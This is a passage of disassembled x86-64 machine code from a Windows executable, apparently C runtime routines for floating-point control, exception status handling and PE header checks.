   14000e082:	eb 2d                	jmp    0x14000e0b1
   14000e084:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   14000e08b:	00 
   14000e08c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000e08f:	f2 0f 11 44 24 38    	movsd  %xmm0,0x38(%rsp)
   14000e095:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   14000e09b:	f2 0f 11 5c 24 30    	movsd  %xmm3,0x30(%rsp)
   14000e0a1:	c7 44 24 28 22 00 00 	movl   $0x22,0x28(%rsp)
   14000e0a8:	00 
   14000e0a9:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   14000e0b0:	00 
   14000e0b1:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   14000e0b8:	00 
   14000e0b9:	f2 0f 11 74 24 78    	movsd  %xmm6,0x78(%rsp)
   14000e0bf:	4c 8b 44 24 78       	mov    0x78(%rsp),%r8
   14000e0c4:	e8 bb fd ff ff       	call   0x14000de84
   14000e0c9:	0f 28 c6             	movaps %xmm6,%xmm0
   14000e0cc:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   14000e0d1:	48 83 c4 68          	add    $0x68,%rsp
   14000e0d5:	c3                   	ret
   14000e0d6:	cc                   	int3
   14000e0d7:	cc                   	int3
   14000e0d8:	cc                   	int3
   14000e0d9:	cc                   	int3
   14000e0da:	cc                   	int3
   14000e0db:	cc                   	int3
   14000e0dc:	cc                   	int3
   14000e0dd:	cc                   	int3
   14000e0de:	cc                   	int3
   14000e0df:	cc                   	int3
   14000e0e0:	cc                   	int3
   14000e0e1:	cc                   	int3
   14000e0e2:	cc                   	int3
   14000e0e3:	cc                   	int3
   14000e0e4:	cc                   	int3
   14000e0e5:	cc                   	int3
   14000e0e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000e0ed:	00 00 00 
   14000e0f0:	48 83 ec 08          	sub    $0x8,%rsp
   14000e0f4:	0f ae 1c 24          	stmxcsr (%rsp)
   14000e0f8:	8b 04 24             	mov    (%rsp),%eax
   14000e0fb:	48 83 c4 08          	add    $0x8,%rsp
   14000e0ff:	c3                   	ret
   14000e100:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000e104:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000e109:	c3                   	ret
   14000e10a:	0f ae 5c 24 08       	stmxcsr 0x8(%rsp)
   14000e10f:	b9 c0 ff ff ff       	mov    $0xffffffc0,%ecx
   14000e114:	21 4c 24 08          	and    %ecx,0x8(%rsp)
   14000e118:	0f ae 54 24 08       	ldmxcsr 0x8(%rsp)
   14000e11d:	c3                   	ret
   14000e11e:	66 0f 2e 05 7a 87 00 	ucomisd 0x877a(%rip),%xmm0        # 0x1400168a0
   14000e125:	00 
   14000e126:	73 14                	jae    0x14000e13c
   14000e128:	66 0f 2e 05 78 87 00 	ucomisd 0x8778(%rip),%xmm0        # 0x1400168a8
   14000e12f:	00 
   14000e130:	76 0a                	jbe    0x14000e13c
   14000e132:	f2 48 0f 2d c8       	cvtsd2si %xmm0,%rcx
   14000e137:	f2 48 0f 2a c1       	cvtsi2sd %rcx,%xmm0
   14000e13c:	c3                   	ret
   14000e13d:	cc                   	int3
   14000e13e:	cc                   	int3
   14000e13f:	cc                   	int3
   14000e140:	48 83 ec 48          	sub    $0x48,%rsp
   14000e144:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000e149:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   14000e14e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000e153:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000e158:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000e15d:	e8 06 00 00 00       	call   0x14000e168
   14000e162:	48 83 c4 48          	add    $0x48,%rsp
   14000e166:	c3                   	ret
   14000e167:	cc                   	int3
   14000e168:	48 8b c4             	mov    %rsp,%rax
   14000e16b:	48 89 58 10          	mov    %rbx,0x10(%rax)
   14000e16f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000e173:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000e177:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000e17b:	55                   	push   %rbp
   14000e17c:	48 8b ec             	mov    %rsp,%rbp
   14000e17f:	48 83 ec 20          	sub    $0x20,%rsp
   14000e183:	48 8b da             	mov    %rdx,%rbx
   14000e186:	41 8b f1             	mov    %r9d,%esi
   14000e189:	33 d2                	xor    %edx,%edx
   14000e18b:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
   14000e190:	89 51 04             	mov    %edx,0x4(%rcx)
   14000e193:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e197:	89 50 08             	mov    %edx,0x8(%rax)
   14000e19a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e19e:	89 50 0c             	mov    %edx,0xc(%rax)
   14000e1a1:	41 f6 c0 10          	test   $0x10,%r8b
   14000e1a5:	74 0d                	je     0x14000e1b4
   14000e1a7:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e1ab:	bf 8f 00 00 c0       	mov    $0xc000008f,%edi
   14000e1b0:	83 48 04 01          	orl    $0x1,0x4(%rax)
   14000e1b4:	41 f6 c0 02          	test   $0x2,%r8b
   14000e1b8:	74 0d                	je     0x14000e1c7
   14000e1ba:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e1be:	bf 93 00 00 c0       	mov    $0xc0000093,%edi
   14000e1c3:	83 48 04 02          	orl    $0x2,0x4(%rax)
   14000e1c7:	41 f6 c0 01          	test   $0x1,%r8b
   14000e1cb:	74 0d                	je     0x14000e1da
   14000e1cd:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e1d1:	bf 91 00 00 c0       	mov    $0xc0000091,%edi
   14000e1d6:	83 48 04 04          	orl    $0x4,0x4(%rax)
   14000e1da:	41 f6 c0 04          	test   $0x4,%r8b
   14000e1de:	74 0d                	je     0x14000e1ed
   14000e1e0:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e1e4:	bf 8e 00 00 c0       	mov    $0xc000008e,%edi
   14000e1e9:	83 48 04 08          	orl    $0x8,0x4(%rax)
   14000e1ed:	41 f6 c0 08          	test   $0x8,%r8b
   14000e1f1:	74 0d                	je     0x14000e200
   14000e1f3:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e1f7:	bf 90 00 00 c0       	mov    $0xc0000090,%edi
   14000e1fc:	83 48 04 10          	orl    $0x10,0x4(%rax)
   14000e200:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e204:	48 8b 03             	mov    (%rbx),%rax
   14000e207:	48 c1 e8 07          	shr    $0x7,%rax
   14000e20b:	c1 e0 04             	shl    $0x4,%eax
   14000e20e:	f7 d0                	not    %eax
   14000e210:	33 41 08             	xor    0x8(%rcx),%eax
   14000e213:	83 e0 10             	and    $0x10,%eax
   14000e216:	31 41 08             	xor    %eax,0x8(%rcx)
   14000e219:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e21d:	48 8b 03             	mov    (%rbx),%rax
   14000e220:	48 c1 e8 09          	shr    $0x9,%rax
   14000e224:	c1 e0 03             	shl    $0x3,%eax
   14000e227:	f7 d0                	not    %eax
   14000e229:	33 41 08             	xor    0x8(%rcx),%eax
   14000e22c:	83 e0 08             	and    $0x8,%eax
   14000e22f:	31 41 08             	xor    %eax,0x8(%rcx)
   14000e232:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e236:	48 8b 03             	mov    (%rbx),%rax
   14000e239:	48 c1 e8 0a          	shr    $0xa,%rax
   14000e23d:	c1 e0 02             	shl    $0x2,%eax
   14000e240:	f7 d0                	not    %eax
   14000e242:	33 41 08             	xor    0x8(%rcx),%eax
   14000e245:	83 e0 04             	and    $0x4,%eax
   14000e248:	31 41 08             	xor    %eax,0x8(%rcx)
   14000e24b:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e24f:	48 8b 03             	mov    (%rbx),%rax
   14000e252:	48 c1 e8 0b          	shr    $0xb,%rax
   14000e256:	03 c0                	add    %eax,%eax
   14000e258:	f7 d0                	not    %eax
   14000e25a:	33 41 08             	xor    0x8(%rcx),%eax
   14000e25d:	83 e0 02             	and    $0x2,%eax
   14000e260:	31 41 08             	xor    %eax,0x8(%rcx)
   14000e263:	8b 03                	mov    (%rbx),%eax
   14000e265:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e269:	48 c1 e8 0c          	shr    $0xc,%rax
   14000e26d:	f7 d0                	not    %eax
   14000e26f:	33 41 08             	xor    0x8(%rcx),%eax
   14000e272:	83 e0 01             	and    $0x1,%eax
   14000e275:	31 41 08             	xor    %eax,0x8(%rcx)
   14000e278:	e8 e7 02 00 00       	call   0x14000e564
   14000e27d:	48 8b d0             	mov    %rax,%rdx
   14000e280:	a8 01                	test   $0x1,%al
   14000e282:	74 08                	je     0x14000e28c
   14000e284:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e288:	83 49 0c 10          	orl    $0x10,0xc(%rcx)
   14000e28c:	f6 c2 04             	test   $0x4,%dl
   14000e28f:	74 08                	je     0x14000e299
   14000e291:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e295:	83 49 0c 08          	orl    $0x8,0xc(%rcx)
   14000e299:	f6 c2 08             	test   $0x8,%dl
   14000e29c:	74 08                	je     0x14000e2a6
   14000e29e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e2a2:	83 48 0c 04          	orl    $0x4,0xc(%rax)
   14000e2a6:	f6 c2 10             	test   $0x10,%dl
   14000e2a9:	74 08                	je     0x14000e2b3
   14000e2ab:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e2af:	83 48 0c 02          	orl    $0x2,0xc(%rax)
   14000e2b3:	f6 c2 20             	test   $0x20,%dl
   14000e2b6:	74 08                	je     0x14000e2c0
   14000e2b8:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e2bc:	83 48 0c 01          	orl    $0x1,0xc(%rax)
   14000e2c0:	8b 03                	mov    (%rbx),%eax
   14000e2c2:	b9 00 60 00 00       	mov    $0x6000,%ecx
   14000e2c7:	48 23 c1             	and    %rcx,%rax
   14000e2ca:	74 3e                	je     0x14000e30a
   14000e2cc:	48 3d 00 20 00 00    	cmp    $0x2000,%rax
   14000e2d2:	74 26                	je     0x14000e2fa
   14000e2d4:	48 3d 00 40 00 00    	cmp    $0x4000,%rax
   14000e2da:	74 0e                	je     0x14000e2ea
   14000e2dc:	48 3b c1             	cmp    %rcx,%rax
   14000e2df:	75 30                	jne    0x14000e311
   14000e2e1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e2e5:	83 08 03             	orl    $0x3,(%rax)
   14000e2e8:	eb 27                	jmp    0x14000e311
   14000e2ea:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e2ee:	83 20 fe             	andl   $0xfffffffe,(%rax)
   14000e2f1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e2f5:	83 08 02             	orl    $0x2,(%rax)
   14000e2f8:	eb 17                	jmp    0x14000e311
   14000e2fa:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e2fe:	83 20 fd             	andl   $0xfffffffd,(%rax)
   14000e301:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e305:	83 08 01             	orl    $0x1,(%rax)
   14000e308:	eb 07                	jmp    0x14000e311
   14000e30a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e30e:	83 20 fc             	andl   $0xfffffffc,(%rax)
   14000e311:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e315:	81 e6 ff 0f 00 00    	and    $0xfff,%esi
   14000e31b:	c1 e6 05             	shl    $0x5,%esi
   14000e31e:	81 20 1f 00 fe ff    	andl   $0xfffe001f,(%rax)
   14000e324:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e328:	09 30                	or     %esi,(%rax)
   14000e32a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e32e:	48 8b 75 38          	mov    0x38(%rbp),%rsi
   14000e332:	83 48 20 01          	orl    $0x1,0x20(%rax)
   14000e336:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000e33a:	74 33                	je     0x14000e36f
   14000e33c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e340:	ba e1 ff ff ff       	mov    $0xffffffe1,%edx
   14000e345:	21 50 20             	and    %edx,0x20(%rax)
   14000e348:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000e34c:	8b 08                	mov    (%rax),%ecx
   14000e34e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e352:	89 48 10             	mov    %ecx,0x10(%rax)
   14000e355:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e359:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000e35d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e361:	21 50 60             	and    %edx,0x60(%rax)
   14000e364:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e368:	8b 0e                	mov    (%rsi),%ecx
   14000e36a:	89 48 50             	mov    %ecx,0x50(%rax)
   14000e36d:	eb 48                	jmp    0x14000e3b7
   14000e36f:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e373:	41 b8 e3 ff ff ff    	mov    $0xffffffe3,%r8d
   14000e379:	8b 41 20             	mov    0x20(%rcx),%eax
   14000e37c:	41 23 c0             	and    %r8d,%eax
   14000e37f:	83 c8 02             	or     $0x2,%eax
   14000e382:	89 41 20             	mov    %eax,0x20(%rcx)
   14000e385:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000e389:	48 8b 08             	mov    (%rax),%rcx
   14000e38c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e390:	48 89 48 10          	mov    %rcx,0x10(%rax)
   14000e394:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e398:	83 48 60 01          	orl    $0x1,0x60(%rax)
   14000e39c:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   14000e3a0:	8b 42 60             	mov    0x60(%rdx),%eax
   14000e3a3:	41 23 c0             	and    %r8d,%eax
   14000e3a6:	83 c8 02             	or     $0x2,%eax
   14000e3a9:	89 42 60             	mov    %eax,0x60(%rdx)
   14000e3ac:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000e3b0:	48 8b 16             	mov    (%rsi),%rdx
   14000e3b3:	48 89 50 50          	mov    %rdx,0x50(%rax)
   14000e3b7:	e8 ec 00 00 00       	call   0x14000e4a8
   14000e3bc:	33 d2                	xor    %edx,%edx
   14000e3be:	4c 8d 4d 10          	lea    0x10(%rbp),%r9
   14000e3c2:	8b cf                	mov    %edi,%ecx
   14000e3c4:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   14000e3c8:	ff 15 22 0f 00 00    	call   *0xf22(%rip)        # 0x14000f2f0
   14000e3ce:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000e3d2:	8b 41 08             	mov    0x8(%rcx),%eax
   14000e3d5:	a8 10                	test   $0x10,%al
   14000e3d7:	74 08                	je     0x14000e3e1
   14000e3d9:	48 0f ba 33 07       	btrq   $0x7,(%rbx)
   14000e3de:	8b 41 08             	mov    0x8(%rcx),%eax
   14000e3e1:	a8 08                	test   $0x8,%al
   14000e3e3:	74 08                	je     0x14000e3ed
   14000e3e5:	48 0f ba 33 09       	btrq   $0x9,(%rbx)
   14000e3ea:	8b 41 08             	mov    0x8(%rcx),%eax
   14000e3ed:	a8 04                	test   $0x4,%al
   14000e3ef:	74 08                	je     0x14000e3f9
   14000e3f1:	48 0f ba 33 0a       	btrq   $0xa,(%rbx)
   14000e3f6:	8b 41 08             	mov    0x8(%rcx),%eax
   14000e3f9:	a8 02                	test   $0x2,%al
   14000e3fb:	74 08                	je     0x14000e405
   14000e3fd:	48 0f ba 33 0b       	btrq   $0xb,(%rbx)
   14000e402:	8b 41 08             	mov    0x8(%rcx),%eax
   14000e405:	a8 01                	test   $0x1,%al
   14000e407:	74 05                	je     0x14000e40e
   14000e409:	48 0f ba 33 0c       	btrq   $0xc,(%rbx)
   14000e40e:	8b 01                	mov    (%rcx),%eax
   14000e410:	83 e0 03             	and    $0x3,%eax
   14000e413:	74 30                	je     0x14000e445
   14000e415:	83 e8 01             	sub    $0x1,%eax
   14000e418:	74 1f                	je     0x14000e439
   14000e41a:	83 e8 01             	sub    $0x1,%eax
   14000e41d:	74 0e                	je     0x14000e42d
   14000e41f:	83 f8 01             	cmp    $0x1,%eax
   14000e422:	75 28                	jne    0x14000e44c
   14000e424:	48 81 0b 00 60 00 00 	orq    $0x6000,(%rbx)
   14000e42b:	eb 1f                	jmp    0x14000e44c
   14000e42d:	48 0f ba 33 0d       	btrq   $0xd,(%rbx)
   14000e432:	48 0f ba 2b 0e       	btsq   $0xe,(%rbx)
   14000e437:	eb 13                	jmp    0x14000e44c
   14000e439:	48 0f ba 33 0e       	btrq   $0xe,(%rbx)
   14000e43e:	48 0f ba 2b 0d       	btsq   $0xd,(%rbx)
   14000e443:	eb 07                	jmp    0x14000e44c
   14000e445:	48 81 23 ff 9f ff ff 	andq   $0xffffffffffff9fff,(%rbx)
   14000e44c:	83 7d 40 00          	cmpl   $0x0,0x40(%rbp)
   14000e450:	74 07                	je     0x14000e459
   14000e452:	8b 41 50             	mov    0x50(%rcx),%eax
   14000e455:	89 06                	mov    %eax,(%rsi)
   14000e457:	eb 07                	jmp    0x14000e460
   14000e459:	48 8b 41 50          	mov    0x50(%rcx),%rax
   14000e45d:	48 89 06             	mov    %rax,(%rsi)
   14000e460:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000e465:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000e46a:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000e46f:	48 83 c4 20          	add    $0x20,%rsp
   14000e473:	5d                   	pop    %rbp
   14000e474:	c3                   	ret
   14000e475:	cc                   	int3
   14000e476:	cc                   	int3
   14000e477:	cc                   	int3
   14000e478:	48 83 ec 28          	sub    $0x28,%rsp
   14000e47c:	83 f9 01             	cmp    $0x1,%ecx
   14000e47f:	74 15                	je     0x14000e496
   14000e481:	8d 41 fe             	lea    -0x2(%rcx),%eax
   14000e484:	83 f8 01             	cmp    $0x1,%eax
   14000e487:	77 18                	ja     0x14000e4a1
   14000e489:	e8 b2 92 ff ff       	call   0x140007740
   14000e48e:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   14000e494:	eb 0b                	jmp    0x14000e4a1
   14000e496:	e8 a5 92 ff ff       	call   0x140007740
   14000e49b:	c7 00 21 00 00 00    	movl   $0x21,(%rax)
   14000e4a1:	48 83 c4 28          	add    $0x28,%rsp
   14000e4a5:	c3                   	ret
   14000e4a6:	cc                   	int3
   14000e4a7:	cc                   	int3
   14000e4a8:	40 53                	rex push %rbx
   14000e4aa:	48 83 ec 20          	sub    $0x20,%rsp
   14000e4ae:	e8 3d fc ff ff       	call   0x14000e0f0
   14000e4b3:	8b d8                	mov    %eax,%ebx
   14000e4b5:	83 e3 3f             	and    $0x3f,%ebx
   14000e4b8:	e8 4d fc ff ff       	call   0x14000e10a
   14000e4bd:	8b c3                	mov    %ebx,%eax
   14000e4bf:	48 83 c4 20          	add    $0x20,%rsp
   14000e4c3:	5b                   	pop    %rbx
   14000e4c4:	c3                   	ret
   14000e4c5:	cc                   	int3
   14000e4c6:	cc                   	int3
   14000e4c7:	cc                   	int3
   14000e4c8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000e4cd:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000e4d2:	57                   	push   %rdi
   14000e4d3:	48 83 ec 20          	sub    $0x20,%rsp
   14000e4d7:	48 8b da             	mov    %rdx,%rbx
   14000e4da:	48 8b f9             	mov    %rcx,%rdi
   14000e4dd:	e8 0e fc ff ff       	call   0x14000e0f0
   14000e4e2:	8b f0                	mov    %eax,%esi
   14000e4e4:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000e4e8:	8b cb                	mov    %ebx,%ecx
   14000e4ea:	f7 d1                	not    %ecx
   14000e4ec:	81 c9 7f 80 ff ff    	or     $0xffff807f,%ecx
   14000e4f2:	23 c8                	and    %eax,%ecx
   14000e4f4:	23 fb                	and    %ebx,%edi
   14000e4f6:	0b cf                	or     %edi,%ecx
   14000e4f8:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   14000e4fc:	80 3d dd c4 00 00 00 	cmpb   $0x0,0xc4dd(%rip)        # 0x14001a9e0
   14000e503:	74 25                	je     0x14000e52a
   14000e505:	f6 c1 40             	test   $0x40,%cl
   14000e508:	74 20                	je     0x14000e52a
   14000e50a:	e8 f1 fb ff ff       	call   0x14000e100
   14000e50f:	eb 21                	jmp    0x14000e532
   14000e511:	c6 05 c8 c4 00 00 00 	movb   $0x0,0xc4c8(%rip)        # 0x14001a9e0
   14000e518:	8b 4c 24 30          	mov    0x30(%rsp),%ecx
   14000e51c:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000e51f:	e8 dc fb ff ff       	call   0x14000e100
   14000e524:	8b 74 24 38          	mov    0x38(%rsp),%esi
   14000e528:	eb 08                	jmp    0x14000e532
   14000e52a:	83 e1 bf             	and    $0xffffffbf,%ecx
   14000e52d:	e8 ce fb ff ff       	call   0x14000e100
   14000e532:	8b c6                	mov    %esi,%eax
   14000e534:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000e539:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000e53e:	48 83 c4 20          	add    $0x20,%rsp
   14000e542:	5f                   	pop    %rdi
   14000e543:	c3                   	ret
   14000e544:	40 53                	rex push %rbx
   14000e546:	48 83 ec 20          	sub    $0x20,%rsp
   14000e54a:	48 8b d9             	mov    %rcx,%rbx
   14000e54d:	e8 9e fb ff ff       	call   0x14000e0f0
   14000e552:	83 e3 3f             	and    $0x3f,%ebx
   14000e555:	0b c3                	or     %ebx,%eax
   14000e557:	8b c8                	mov    %eax,%ecx
   14000e559:	48 83 c4 20          	add    $0x20,%rsp
   14000e55d:	5b                   	pop    %rbx
   14000e55e:	e9 9d fb ff ff       	jmp    0x14000e100
   14000e563:	cc                   	int3
   14000e564:	48 83 ec 28          	sub    $0x28,%rsp
   14000e568:	e8 83 fb ff ff       	call   0x14000e0f0
   14000e56d:	83 e0 3f             	and    $0x3f,%eax
   14000e570:	48 83 c4 28          	add    $0x28,%rsp
   14000e574:	c3                   	ret
   14000e575:	cc                   	int3
   14000e576:	cc                   	int3
   14000e577:	cc                   	int3
   14000e578:	cc                   	int3
   14000e579:	cc                   	int3
   14000e57a:	cc                   	int3
   14000e57b:	cc                   	int3
   14000e57c:	cc                   	int3
   14000e57d:	cc                   	int3
   14000e57e:	cc                   	int3
   14000e57f:	cc                   	int3
   14000e580:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   14000e584:	45 33 c9             	xor    %r9d,%r9d
   14000e587:	4c 03 c1             	add    %rcx,%r8
   14000e58a:	4c 8b d2             	mov    %rdx,%r10
   14000e58d:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   14000e592:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   14000e597:	48 83 c0 18          	add    $0x18,%rax
   14000e59b:	49 03 c0             	add    %r8,%rax
   14000e59e:	45 85 db             	test   %r11d,%r11d
   14000e5a1:	74 1e                	je     0x14000e5c1
   14000e5a3:	8b 50 0c             	mov    0xc(%rax),%edx
   14000e5a6:	4c 3b d2             	cmp    %rdx,%r10
   14000e5a9:	72 0a                	jb     0x14000e5b5
   14000e5ab:	8b 48 08             	mov    0x8(%rax),%ecx
   14000e5ae:	03 ca                	add    %edx,%ecx
   14000e5b0:	4c 3b d1             	cmp    %rcx,%r10
   14000e5b3:	72 0e                	jb     0x14000e5c3
   14000e5b5:	41 ff c1             	inc    %r9d
   14000e5b8:	48 83 c0 28          	add    $0x28,%rax
   14000e5bc:	45 3b cb             	cmp    %r11d,%r9d
   14000e5bf:	72 e2                	jb     0x14000e5a3
   14000e5c1:	33 c0                	xor    %eax,%eax
   14000e5c3:	c3                   	ret
   14000e5c4:	cc                   	int3
   14000e5c5:	cc                   	int3
   14000e5c6:	cc                   	int3
   14000e5c7:	cc                   	int3
   14000e5c8:	cc                   	int3
   14000e5c9:	cc                   	int3
   14000e5ca:	cc                   	int3
   14000e5cb:	cc                   	int3
   14000e5cc:	cc                   	int3
   14000e5cd:	cc                   	int3
   14000e5ce:	cc                   	int3
   14000e5cf:	cc                   	int3
   14000e5d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000e5d5:	57                   	push   %rdi
   14000e5d6:	48 83 ec 20          	sub    $0x20,%rsp
   14000e5da:	48 8b d9             	mov    %rcx,%rbx
   14000e5dd:	48 8d 3d 1c 1a ff ff 	lea    -0xe5e4(%rip),%rdi        # 0x140000000
   14000e5e4:	48 8b cf             	mov    %rdi,%rcx
   14000e5e7:	e8 34 00 00 00       	call   0x14000e620
   14000e5ec:	85 c0                	test   %eax,%eax
   14000e5ee:	74 22                	je     0x14000e612
   14000e5f0:	48 2b df             	sub    %rdi,%rbx
   14000e5f3:	48 8b d3             	mov    %rbx,%rdx
   14000e5f6:	48 8b cf             	mov    %rdi,%rcx
   14000e5f9:	e8 82 ff ff ff       	call   0x14000e580
   14000e5fe:	48 85 c0             	test   %rax,%rax
   14000e601:	74 0f                	je     0x14000e612
   14000e603:	8b 40 24             	mov    0x24(%rax),%eax
   14000e606:	c1 e8 1f             	shr    $0x1f,%eax
   14000e609:	f7 d0                	not    %eax
   14000e60b:	83 e0 01             	and    $0x1,%eax
   14000e60e:	eb 02                	jmp    0x14000e612
   14000e610:	33 c0                	xor    %eax,%eax
   14000e612:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000e617:	48 83 c4 20          	add    $0x20,%rsp
   14000e61b:	5f                   	pop    %rdi
   14000e61c:	c3                   	ret
   14000e61d:	cc                   	int3
   14000e61e:	cc                   	int3
   14000e61f:	cc                   	int3
   14000e620:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   14000e625:	66 39 01             	cmp    %ax,(%rcx)
   14000e628:	75 1e                	jne    0x14000e648
   14000e62a:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   14000e62e:	48 03 d1             	add    %rcx,%rdx
   14000e631:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   14000e637:	75 0f                	jne    0x14000e648
   14000e639:	33 c0                	xor    %eax,%eax
   14000e63b:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   14000e640:	66 39 4a 18          	cmp    %cx,0x18(%rdx)
   14000e644:	0f 94 c0             	sete   %al
   14000e647:	c3                   	ret
   14000e648:	33 c0                	xor    %eax,%eax
   14000e64a:	c3                   	ret
   14000e64b:	cc                   	int3
   14000e64c:	48 83 ec 28          	sub    $0x28,%rsp
   14000e650:	4d 8b 41 38          	mov    0x38(%r9),%r8
   14000e654:	48 8b ca             	mov    %rdx,%rcx
   14000e657:	49 8b d1             	mov    %r9,%rdx
   14000e65a:	e8 0d 00 00 00       	call   0x14000e66c
   14000e65f:	b8 01 00 00 00       	mov    $0x1,%eax
   14000e664:	48 83 c4 28          	add    $0x28,%rsp
   14000e668:	c3                   	ret
   14000e669:	cc                   	int3
   14000e66a:	cc                   	int3
   14000e66b:	cc                   	int3
   14000e66c:	40 53                	rex push %rbx
   14000e66e:	45 8b 18             	mov    (%r8),%r11d
   14000e671:	48 8b da             	mov    %rdx,%rbx
   14000e674:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   14000e678:	4c 8b c9             	mov    %rcx,%r9
   14000e67b:	41 f6 00 04          	testb  $0x4,(%r8)
   14000e67f:	4c 8b d1             	mov    %rcx,%r10
   14000e682:	74 13                	je     0x14000e697
   14000e684:	41 8b 40 08          	mov    0x8(%r8),%eax
   14000e688:	4d 63 50 04          	movslq 0x4(%r8),%r10
   14000e68c:	f7 d8                	neg    %eax
   14000e68e:	4c 03 d1             	add    %rcx,%r10
   14000e691:	48 63 c8             	movslq %eax,%rcx
   14000e694:	4c 23 d1             	and    %rcx,%r10
   14000e697:	49 63 c3             	movslq %r11d,%rax
   14000e69a:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   14000e69e:	48 8b 43 10          	mov    0x10(%rbx),%rax
   14000e6a2:	8b 48 08             	mov    0x8(%rax),%ecx
   14000e6a5:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000e6a9:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   14000e6ae:	74 0b                	je     0x14000e6bb
   14000e6b0:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   14000e6b5:	83 e0 f0             	and    $0xfffffff0,%eax
   14000e6b8:	4c 03 c8             	add    %rax,%r9
   14000e6bb:	4c 33 ca             	xor    %rdx,%r9
   14000e6be:	49 8b c9             	mov    %r9,%rcx
   14000e6c1:	5b                   	pop    %rbx
   14000e6c2:	e9 69 4a ff ff       	jmp    0x140003130
   14000e6c7:	cc                   	int3
   14000e6c8:	cc                   	int3
   14000e6c9:	cc                   	int3
   14000e6ca:	cc                   	int3
   14000e6cb:	cc                   	int3
   14000e6cc:	cc                   	int3
   14000e6cd:	cc                   	int3
   14000e6ce:	cc                   	int3
   14000e6cf:	cc                   	int3
   14000e6d0:	cc                   	int3
   14000e6d1:	cc                   	int3
   14000e6d2:	cc                   	int3
   14000e6d3:	cc                   	int3
   14000e6d4:	cc                   	int3
   14000e6d5:	cc                   	int3
